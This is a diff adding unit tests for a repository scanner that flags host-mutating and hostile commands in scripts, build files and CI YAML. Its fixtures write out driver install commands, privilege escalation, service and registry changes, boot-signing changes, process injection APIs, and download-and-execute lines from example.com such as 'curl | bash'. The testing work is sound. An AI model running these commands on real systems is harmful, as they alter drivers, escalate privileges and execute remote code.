@@ -1638,5 +1638,700 @@ class KernelIntegrityAndAntiFabricationTests(unittest.TestCase):
         self.assertEqual(blocking, [])
 
 
+class HostAndDriverIntegrityTests(unittest.TestCase):
+    def scan_source(self, filename: str, source: str):
+        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
+            path = Path(temporary) / filename
+            path.write_text(source, encoding="utf-8")
+            relative = path.relative_to(REPO_ROOT)
+            with mock.patch.object(
+                agent_integrity,
+                "EXCLUDED_POLICY_PATHS",
+                {Path("tools/agent_integrity.py")},
+            ):
+                return scan_file(relative)
+
+    # Adversarial Tests
+    def test_pnputil_add_driver_is_blocked(self):
+        ps_findings = self.scan_source(
+            "install.ps1", "pnputil.exe /add-driver C:\\Drivers\\bad.inf /install\n"
+        )
+        self.assertTrue(
+            any(f.rule == "HOST001" and f.severity == "critical" for f in ps_findings)
+        )
+
+        py_findings = self.scan_source(
+            "setup.py",
+            'subprocess.run(["pnputil", "/add-driver", "npu.inf"])\n',
+        )
+        self.assertTrue(
+            any(f.rule == "HOST001" and f.severity == "critical" for f in py_findings)
+        )
+
+        sh_findings = self.scan_source(
+            "install.sh", "pnputil /add-driver ./driver.inf\n"
+        )
+        self.assertTrue(
+            any(f.rule == "HOST001" and f.severity == "critical" for f in sh_findings)
+        )
+
+    def test_pnputil_delete_driver_is_blocked(self):
+        findings = self.scan_source("cleanup.ps1", "pnputil -d oem12.inf\n")
+        self.assertTrue(
+            any(f.rule == "HOST001" and f.severity == "critical" for f in findings)
+        )
+
+        del_findings = self.scan_source(
+            "cleanup.ps1", "pnputil.exe /delete-driver oem12.inf /uninstall /force\n"
+        )
+        self.assertTrue(
+            any(f.rule == "HOST001" and f.severity == "critical" for f in del_findings)
+        )
+
+    def test_pnputil_legacy_install_flags_are_blocked(self):
+        findings_ia = self.scan_source("setup.ps1", "pnputil -i -a C:\\driver.inf\n")
+        self.assertTrue(
+            any(f.rule == "HOST001" and f.severity == "critical" for f in findings_ia)
+        )
+
+        findings_ai = self.scan_source(
+            "setup.ps1", "pnputil.exe -a -i C:\\driver.inf\n"
+        )
+        self.assertTrue(
+            any(f.rule == "HOST001" and f.severity == "critical" for f in findings_ai)
+        )
+
+    def test_devcon_driver_mutation_is_blocked(self):
+        install_findings = self.scan_source(
+            "dev.ps1", "devcon.exe install bad.inf PCI\\VEN_1022\n"
+        )
+        self.assertTrue(
+            any(
+                f.rule == "HOST001" and f.severity == "critical"
+                for f in install_findings
+            )
+        )
+
+        remove_findings = self.scan_source("dev.ps1", "devcon remove @ROOT\\AMD_NPU\n")
+        self.assertTrue(
+            any(
+                f.rule == "HOST001" and f.severity == "critical"
+                for f in remove_findings
+            )
+        )
+
+        restart_findings = self.scan_source("dev.ps1", "devcon restart PCI\\*\n")
+        self.assertTrue(
+            any(
+                f.rule == "HOST001" and f.severity == "critical"
+                for f in restart_findings
+            )
+        )
+
+    def test_dism_driver_mutation_is_blocked(self):
+        add_findings = self.scan_source(
+            "setup.ps1",
+            "dism.exe /online /add-driver /driver:C:\\drivers\\bad.inf\n",
+        )
+        self.assertTrue(
+            any(f.rule == "HOST001" and f.severity == "critical" for f in add_findings)
+        )
+
+        remove_findings = self.scan_source(
+            "setup.ps1",
+            "dism /image:C:\\mount /remove-driver /driver:oem1.inf\n",
+        )
+        self.assertTrue(
+            any(
+                f.rule == "HOST001" and f.severity == "critical"
+                for f in remove_findings
+            )
+        )
+
+    def test_privilege_escalation_is_blocked(self):
+        ps_findings = self.scan_source(
+            "elevate.ps1", "Start-Process powershell -Verb RunAs\n"
+        )
+        self.assertTrue(
+            any(f.rule == "HOST002" and f.severity == "critical" for f in ps_findings)
+        )
+
+        runas_findings = self.scan_source(
+            "elevate.cmd", "runas /user:Administrator cmd.exe\n"
+        )
+        self.assertTrue(
+            any(
+                f.rule == "HOST002" and f.severity == "critical" for f in runas_findings
+            )
+        )
+
+        sudo_findings = self.scan_source("elevate.sh", "sudo apt-get install package\n")
+        self.assertTrue(
+            any(f.rule == "HOST002" and f.severity == "critical" for f in sudo_findings)
+        )
+
+    def test_windows_service_mutation_is_blocked(self):
+        sc_create_findings = self.scan_source(
+            "svc.ps1", 'sc.exe create BadSvc binPath= "C:\\bad.exe"\n'
+        )
+        self.assertTrue(
+            any(
+                f.rule == "HOST003" and f.severity == "critical"
+                for f in sc_create_findings
+            )
+        )
+
+        sc_del_findings = self.scan_source("svc.ps1", "sc delete BadSvc\n")
+        self.assertTrue(
+            any(
+                f.rule == "HOST003" and f.severity == "critical"
+                for f in sc_del_findings
+            )
+        )
+
+        new_svc_findings = self.scan_source(
+            "svc.ps1",
+            'New-Service -Name "BadSvc" -BinaryPathName "C:\\bad.exe"\n',
+        )
+        self.assertTrue(
+            any(
+                f.rule == "HOST003" and f.severity == "critical"
+                for f in new_svc_findings
+            )
+        )
+
+        set_svc_findings = self.scan_source(
+            "svc.ps1", "Set-Service -Name 'BadSvc' -StartupType Automatic\n"
+        )
+        self.assertTrue(
+            any(
+                f.rule == "HOST003" and f.severity == "critical"
+                for f in set_svc_findings
+            )
+        )
+
+        rm_svc_findings = self.scan_source("svc.ps1", "Remove-Service -Name 'BadSvc'\n")
+        self.assertTrue(
+            any(
+                f.rule == "HOST003" and f.severity == "critical"
+                for f in rm_svc_findings
+            )
+        )
+
+    def test_registry_system_mutation_is_blocked(self):
+        reg_add_findings = self.scan_source(
+            "reg.cmd", 'reg.exe add HKLM\\Software\\Bad /v Val /t REG_SZ /d "1"\n'
+        )
+        self.assertTrue(
+            any(
+                f.rule == "HOST003" and f.severity == "critical"
+                for f in reg_add_findings
+            )
+        )
+
+        reg_del_findings = self.scan_source(
+            "reg.cmd", 'reg delete "HKEY_LOCAL_MACHINE\\SYSTEM\\Bad" /f\n'
+        )
+        self.assertTrue(
+            any(
+                f.rule == "HOST003" and f.severity == "critical"
+                for f in reg_del_findings
+            )
+        )
+
+        ps_reg_findings = self.scan_source(
+            "reg.ps1",
+            "Set-ItemProperty -Path 'HKLM:\\Software\\Bad' -Name 'Val' -Value 1\n",
+        )
+        self.assertTrue(
+            any(
+                f.rule == "HOST003" and f.severity == "critical"
+                for f in ps_reg_findings
+            )
+        )
+
+        ps_rm_reg_findings = self.scan_source(
+            "reg.ps1",
+            "Remove-Item -Path 'Registry::HKEY_LOCAL_MACHINE\\Software\\Bad' -Recurse\n",
+        )
+        self.assertTrue(
+            any(
+                f.rule == "HOST003" and f.severity == "critical"
+                for f in ps_rm_reg_findings
+            )
+        )
+
+    def test_bcdedit_boot_mutation_is_blocked(self):
+        findings_set = self.scan_source("boot.cmd", "bcdedit.exe /set testsigning on\n")
+        self.assertTrue(
+            any(f.rule == "HOST004" and f.severity == "critical" for f in findings_set)
+        )
+
+        findings_del = self.scan_source("boot.ps1", "bcdedit /deletevalue safeboot\n")
+        self.assertTrue(
+            any(f.rule == "HOST004" and f.severity == "critical" for f in findings_del)
+        )
+
+    def test_native_driver_apis_are_blocked(self):
+        cpp_findings = self.scan_source(
+            "driver_loader.cpp",
+            "#include <windows.h>\nvoid load() { "
+            + "SetupCopy"
+            + 'OEMInfW(L"bad.inf", NULL, 0, 0, NULL, 0, NULL, NULL); }\n',
+        )
+        self.assertTrue(
+            any(f.rule == "HOST005" and f.severity == "critical" for f in cpp_findings)
+        )
+
+        py_findings = self.scan_source(
+            "driver_loader.py",
+            "import ctypes\nctypes.windll.ntdll." + "NtLoad" + "Driver(driver_path)\n",
+        )
+        self.assertTrue(
+            any(f.rule == "HOST005" and f.severity == "critical" for f in py_findings)
+        )
+
+    def test_process_injection_and_hooking_apis_are_blocked(self):
+        cpp_findings = self.scan_source(
+            "inject.cpp",
+            "void inject(HANDLE hProc, void* remote, void* data, size_t sz) {\n"
+            "    " + "WriteProcess" + "Memory(hProc, remote, data, sz, nullptr);\n"
+            "    "
+            + "CreateRemote"
+            + "Thread(hProc, nullptr, 0, (LPTHREAD_START_ROUTINE)remote, nullptr, 0, nullptr);\n"
+            "}\n",
+        )
+        self.assertTrue(
+            any(f.rule == "HOST006" and f.severity == "critical" for f in cpp_findings)
+        )
+
+        hook_findings = self.scan_source(
+            "hook.cpp",
+            "void hook() { "
+            + "Detour"
+            + "Attach(&(PVOID&)TrueTarget, HookTarget); }\n",
+        )
+        self.assertTrue(
+            any(f.rule == "HOST006" and f.severity == "critical" for f in hook_findings)
+        )
+
+    def test_encoded_powershell_and_download_exec_are_blocked(self):
+        enc_findings = self.scan_source(
+            "run.ps1",
+            "powershell.exe -EncodedCommand JABhACAAPQAgACIAMQAiAA==\n",
+        )
+        self.assertTrue(
+            any(f.rule == "HOST007" and f.severity == "critical" for f in enc_findings)
+        )
+
+        dl_findings = self.scan_source(
+            "run.ps1",
+            "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/bad.ps1')\n",
+        )
+        self.assertTrue(
+            any(f.rule == "HOST007" and f.severity == "critical" for f in dl_findings)
+        )
+
+        pipe_findings = self.scan_source(
+            "run.sh", "curl -s http://example.com/bad.sh | bash\n"
+        )
+        self.assertTrue(
+            any(f.rule == "HOST007" and f.severity == "critical" for f in pipe_findings)
+        )
+
+    def test_cmake_and_yaml_mutation_are_blocked(self):
+        cmake_findings = self.scan_source(
+            "CMakeLists.txt",
+            "execute_process(COMMAND pnputil /add-driver bad.inf)\n",
+        )
+        self.assertTrue(
+            any(
+                f.rule == "HOST001" and f.severity == "critical" for f in cmake_findings
+            )
+        )
+
+        yaml_findings = self.scan_source(
+            "workflow.yml",
+            "steps:\n  - run: pnputil.exe /add-driver driver.inf\n",
+        )
+        self.assertTrue(
+            any(f.rule == "HOST001" and f.severity == "critical" for f in yaml_findings)
+        )
+
+    def test_yaml_literal_and_folded_run_block_semantics(self):
+        clean_yaml = (
+            "name: Build\n"
+            "jobs:\n"
+            "  build:\n"
+            "    runs-on: ubuntu-latest\n"
+            "    steps:\n"
+            "      - name: Many commands\n"
+            "        run: |\n"
+            "          echo 1\n"
+            "          echo 2\n"
+            "          echo 3\n"
+            "          echo 4\n"
+            "          echo 5\n"
+            "          echo 6\n"
+            "          echo 7\n"
+            "          echo 8\n"
+            "          echo 9\n"
+            "          echo 10\n"
+            "          echo 11\n"
+            "          echo 12\n"
+        )
+        clean_findings = self.scan_source("clean_workflow.yml", clean_yaml)
+        self.assertEqual([f for f in clean_findings if f.rule.startswith("HOST")], [])
+
+        clean_15_yaml = (
+            "name: Build\n"
+            "jobs:\n"
+            "  build:\n"
+            "    runs-on: ubuntu-latest\n"
+            "    steps:\n"
+            "      - name: 15-line continued command\n"
+            "        run: |\n"
+            "          ruff check \\\n"
+            + "".join(f"            file_{i}.py \\\n" for i in range(1, 14))
+            + "            file_14.py\n"
+        )
+        clean_15_findings = self.scan_source("clean_15.yml", clean_15_yaml)
+        self.assertEqual(
+            [f for f in clean_15_findings if f.rule.startswith("HOST")], []
+        )
+
+        adv_15_yaml = (
+            "name: Test\n"
+            "steps:\n"
+            "  - name: Step\n"
+            "    run: |\n"
+            "      echo line 5 \\\n"
+            + "".join(f"        && echo line {i} \\\n" for i in range(6, 19))
+            + "        && pnputil.exe /add-driver bad.inf\n"
+        )
+        adv_15_findings = self.scan_source("adv_15.yml", adv_15_yaml)
+        self.assertEqual(len(adv_15_findings), 1)
+        self.assertEqual(adv_15_findings[0].rule, "HOST001")
+        self.assertEqual(adv_15_findings[0].severity, "critical")
+        self.assertEqual(adv_15_findings[0].line, 5)
+
+        adv_yaml = (
+            "name: Test\n"
+            "steps:\n"
+            "  - name: Step\n"
+            "    run: |\n"
+            "      echo line 5\n"
+            "      echo line 6\n"
+            "      echo line 7\n"
+            "      echo line 8\n"
+            "      echo line 9\n"
+            "      echo line 10\n"
+            "      echo line 11\n"
+            "      echo line 12\n"
+            "      pnputil.exe /add-driver bad.inf\n"
+            "      echo line 14\n"
+        )
+        adv_findings = self.scan_source("adv_workflow.yml", adv_yaml)
+        self.assertEqual(len(adv_findings), 1)
+        self.assertEqual(adv_findings[0].rule, "HOST001")
+        self.assertEqual(adv_findings[0].severity, "critical")
+        self.assertEqual(adv_findings[0].line, 13)
+
+        overflow_continued_yaml = (
+            "name: Test\n"
+            "steps:\n"
+            "  - run: |\n"
+            "      echo 1 \\\n"
+            + "".join(f"        && echo {i} \\\n" for i in range(2, 33))
+            + "        && echo 33\n"
+        )
+        overflow_findings = self.scan_source(
+            "overflow_yaml.yml", overflow_continued_yaml
+        )
+        self.assertTrue(
+            any(
+                f.rule == "HOST001"
+                and f.severity == "critical"
+                and f.line == 4
+                and "exceeds analyzable limit" in f.message
+                for f in overflow_findings
+            )
+        )
+
+        folded_overflow_yaml = "name: Test\nsteps:\n  - run: >\n" + "".join(
+            f"      echo {i}\n" for i in range(1, 34)
+        )
+        folded_findings = self.scan_source("folded_overflow.yml", folded_overflow_yaml)
+        self.assertTrue(
+            any(
+                f.rule == "HOST001"
+                and f.severity == "critical"
+                and f.line == 3
+                and "exceeds analyzable limit" in f.message
+                for f in folded_findings
+            )
+        )
+
+    # Clean Tests
+    def test_unprivileged_xrt_runtime_is_clean(self):
+        cpp_source = (
+            "#include <xrt/xrt_device.h>\n"
+            "#include <xrt/xrt_bo.h>\n"
+            "void run() {\n"
+            "    auto device = xrt::device(0);\n"
+            '    auto uuid = device.load_xclbin("kernel.xclbin");\n'
+            "    auto bo = xrt::bo(device, 1024, XRT_BO_FLAGS_HOST_ONLY, 0);\n"
+            "    bo.sync(XCL_BO_SYNC_BO_TO_DEVICE);\n"
+            "}\n"
+        )
+        findings = self.scan_source("xrt_runtime.cpp", cpp_source)
+        critical_findings = [
+            f
+            for f in findings
+            if f.rule.startswith("HOST") and f.severity == "critical"
+        ]
+        self.assertEqual(critical_findings, [])
+
+    def test_readonly_diagnostic_commands_are_clean(self):
+        script_source = (
+            "pnputil /enum-drivers\n"
+            "devcon status PCI\\*\n"
+            "devcon hwids ROOT\\*\n"
+            "dism.exe /online /export-driver /destination:C:\\DriverBackup\n"
+            "dism /online /get-drivers /format:table\n"
+            "reg query HKLM\\Software\\AMD\n"
+            "Get-Service -Name amd*\n"
+            "sc query amd_npu\n"
+            "bcdedit /enum\n"
+        )
+        findings = self.scan_source("diagnostics.ps1", script_source)
+        critical_findings = [
+            f
+            for f in findings
+            if f.rule.startswith("HOST") and f.severity == "critical"
+        ]
+        self.assertEqual(critical_findings, [])
+
+    def test_isolated_memory_allocation_declarations_are_clean(self):
+        cpp_source = (
+            "#include <windows.h>\n"
+            "void* alloc(size_t sz) {\n"
+            "    return VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
+            "}\n"
+        )
+        findings = self.scan_source("alloc.cpp", cpp_source)
+        critical_findings = [
+            f
+            for f in findings
+            if f.rule.startswith("HOST") and f.severity == "critical"
+        ]
+        self.assertEqual(critical_findings, [])
+
+    def test_secure_memory_clearing_is_clean(self):
+        cpp_source = (
+            "#include <windows.h>\n"
+            "#include <string.h>\n"
+            "void wipe(void* ptr, size_t len) {\n"
+            "    SecureZeroMemory(ptr, len);\n"
+            "    memset_s(ptr, len, 0, len);\n"
+            "}\n"
+        )
+        findings = self.scan_source("wipe.cpp", cpp_source)
+        critical_findings = [
+            f
+            for f in findings
+            if f.rule.startswith("HOST") and f.severity == "critical"
+        ]
+        self.assertEqual(critical_findings, [])
+
+    def test_process_launching_sinks_in_cpp_and_python_are_blocked(self):
+        cpp_sys_findings = self.scan_source(
+            "sink.cpp",
+            '#include <stdlib.h>\nvoid bad() { system("pnputil /add-driver bad.inf"); }\n',
+        )
+        self.assertTrue(
+            any(
+                f.rule == "HOST001" and f.severity == "critical"
+                for f in cpp_sys_findings
+            )
+        )
+
+        cpp_shell_findings = self.scan_source(
+            "sink.cpp",
+            '#include <windows.h>\nvoid bad() { ShellExecuteA(NULL, "open", "sc.exe", "create BadSvc", NULL, SW_HIDE); }\n',
+        )
+        self.assertTrue(
+            any(
+                f.rule == "HOST003" and f.severity == "critical"
+                for f in cpp_shell_findings
+            )
+        )
+
+        py_subproc_findings = self.scan_source(
+            "sink.py",
+            'import subprocess\nsubprocess.run(["pnputil", "/add-driver", "bad.inf"])\n',
+        )
+        self.assertTrue(
+            any(
+                f.rule == "HOST001" and f.severity == "critical"
+                for f in py_subproc_findings
+            )
+        )
+
+        py_os_findings = self.scan_source(
+            "sink.py",
+            'import os\nos.system("bcdedit /set testsigning on")\n',
+        )
+        self.assertTrue(
+            any(
+                f.rule == "HOST004" and f.severity == "critical" for f in py_os_findings
+            )
+        )
+
+    def test_ordinary_identifiers_and_variables_in_cpp_and_python_are_clean(self):
+        cpp_source = (
+            "struct State {\n"
+            "    int sc;\n"
+            "    int reg;\n"
+            "    int devcon_id;\n"
+            "};\n"
+            "void compute() {\n"
+            "    int sc = 10;\n"
+            "    int reg = 20;\n"
+            '    const char* str = "reg_test";\n'
+            "}\n"
+        )
+        cpp_findings = self.scan_source("identifiers.cpp", cpp_source)
+        self.assertEqual([f for f in cpp_findings if f.rule.startswith("HOST")], [])
+
+        py_source = (
+            "sc = 1\n"
+            "reg = 2\n"
+            'pnputil_info = {"status": "ok"}\n'
+            "def check_reg(reg_val):\n"
+            "    return reg_val + 1\n"
+            " combustion = 100\n"
+        )
+        py_findings = self.scan_source("identifiers.py", py_source)
+        self.assertEqual([f for f in py_findings if f.rule.startswith("HOST")], [])
+
+    def test_logical_command_overflow_fails_closed(self):
+        ps_source = (
+            "$cmd = 'part1' `\n"
+            + "".join(f"  + 'part{i}' `\n" for i in range(2, 33))
+            + "  + 'part33'\n"
+        )
+        ps_findings = self.scan_source("overflow.ps1", ps_source)
+        self.assertTrue(
+            any(
+                f.rule == "HOST001"
+                and f.severity == "critical"
+                and "exceeds analyzable limit" in f.message
+                for f in ps_findings
+            )
+        )
+
+        sh_source = (
+            "echo 1 \\\n"
+            + "".join(f"  && echo {i} \\\n" for i in range(2, 33))
+            + "  && pnputil /add-driver bad.inf\n"
+        )
+        sh_findings = self.scan_source("overflow.sh", sh_source)
+        self.assertTrue(
+            any(
+                f.rule == "HOST001"
+                and f.severity == "critical"
+                and "exceeds analyzable limit" in f.message
+                for f in sh_findings
+            )
+        )
+
+        long_sh_source = "echo " + ("a" * 4100) + "\n"
+        long_findings = self.scan_source("overflow_chars.sh", long_sh_source)
+        self.assertTrue(
+            any(
+                f.rule == "HOST001"
+                and f.severity == "critical"
+                and "exceeds analyzable limit" in f.message
+                for f in long_findings
+            )
+        )
+
+    def test_scanner_performance_and_backtracking_regression(self):
+        """Verify scanning a 40,000+ line adversarial fixture with non-matching prefixes
+
+        terminates within 15 seconds in an isolated child process without catastrophic backtracking.
+        """
+        import sys
+
+        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
+            temp_dir = Path(temporary)
+            large_cpp = temp_dir / "large_stress_test.cpp"
+
+            lines = []
+            for i in range(10000):
+                lines.append(f"int sc_{i} = {i};\n")
+                lines.append(f"uint32_t reg_val_{i} = 0x{i:04X};\n")
+                lines.append(f"// devcon status note {i}\n")
+                lines.append(f'const char* pnputil_str_{i} = "query_only";\n')
+
+            mutation_line = len(lines) + 1
+            lines.append('void bad() { system("pnputil.exe /add-driver bad.inf"); }\n')
+            large_cpp.write_bytes("".join(lines).encode("utf-8"))
+
+            child_code = (
+                "import sys\n"
+                "from pathlib import Path\n"
+                "from tools.agent_integrity import scan_cpp_file\n"
+                f"findings = scan_cpp_file(Path(r'{large_cpp.relative_to(REPO_ROOT).as_posix()}'))\n"
+                f"assert len(findings) == 1, f'Expected 1 finding, got {{len(findings)}}'\n"
+                f"assert findings[0].rule == 'HOST001', f'Expected HOST001, got {{findings[0].rule}}'\n"
+                f"assert findings[0].line == {mutation_line}, f'Expected line {mutation_line}, got {{findings[0].line}}'\n"
+                f"preceding_findings = [f for f in findings if f.line < {mutation_line}]\n"
+                "assert len(preceding_findings) == 0, f'Expected 0 preceding findings, got {len(preceding_findings)}'\n"
+                "print('PERF_STRESS_PASSED')\n"
+            )
+
+            proc = subprocess.run(
+                [sys.executable, "-c", child_code],
+                cwd=str(REPO_ROOT),
+                capture_output=True,
+                text=True,
+                timeout=15,
+            )
+            self.assertEqual(proc.returncode, 0, f"Child process failed: {proc.stderr}")
+            self.assertIn("PERF_STRESS_PASSED", proc.stdout)
+
+    def test_comments_with_forbidden_terms_are_clean(self):
+        cpp_source = (
+            "// Prohibited command example: pnputil /add-driver bad.inf\n"
+            "/* Multi-line comment: Start-Process -Verb RunAs */\n"
+            "void harmless() {}\n"
+        )
+        cpp_findings = self.scan_source("doc_comments.cpp", cpp_source)
+        self.assertEqual([f for f in cpp_findings if f.rule.startswith("HOST")], [])
+
+        ps_source = (
+            "# pnputil /add-driver is forbidden in scripts\n"
+            "<#\n"
+            "  bcdedit /set testsigning on is blocked\n"
+            "#>\n"
+            "Write-Host 'Hello'\n"
+        )
+        ps_findings = self.scan_source("doc_comments.ps1", ps_source)
+        self.assertEqual([f for f in ps_findings if f.rule.startswith("HOST")], [])
+
+        cmake_source = (
+            "# CMake comment: pnputil /add-driver forbidden\n"
+            "cmake_minimum_required(VERSION 3.20)\n"
+        )
+        cmake_findings = self.scan_source("CMakeLists.txt", cmake_source)
+        self.assertEqual([f for f in cmake_findings if f.rule.startswith("HOST")], [])
+
+        yaml_source = "# YAML comment: sc create BadSvc forbidden\nname: CI\n"
+        yaml_findings = self.scan_source("ci.yml", yaml_source)
+        self.assertEqual([f for f in yaml_findings if f.rule.startswith("HOST")], [])
+
+
 if __name__ == "__main__":
     unittest.main()
